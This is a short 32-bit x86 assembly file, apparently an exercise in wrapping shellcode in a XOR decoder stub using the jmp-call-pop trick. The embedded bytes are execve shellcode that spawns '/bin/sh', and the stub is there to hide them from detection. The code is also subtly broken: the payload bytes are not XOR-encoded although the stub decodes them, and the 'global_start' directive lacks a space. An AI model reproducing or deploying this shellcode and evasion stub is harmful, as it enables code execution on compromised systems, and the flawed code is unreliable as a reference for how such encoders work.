BITS 32

global_start

section .text
_start:

    jmp short call_decoder ; Jump down to the bottom for the call trick.

decoder:
    pop esi  ; pop addr of string into esi.

decode:
    xor byte [esi], 0xAA
    jz shellcode
    inc esi
    jmp short decode

call_decoder:
    call decoder ; Use a call to get string address.
    shellcode db 0xeb,0x16,0x5b,0x31,0xc0,0x88,0x43,0x07,0x89,0x5b,0x08,0x89,0x43,0x0c,0x8d,0x4b,0x08,0x8d,0x53,0x0c,0xb0,0x0b,0xcd,0x80,0xe8,0xe5,0xff,0xff,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68, 0xaa
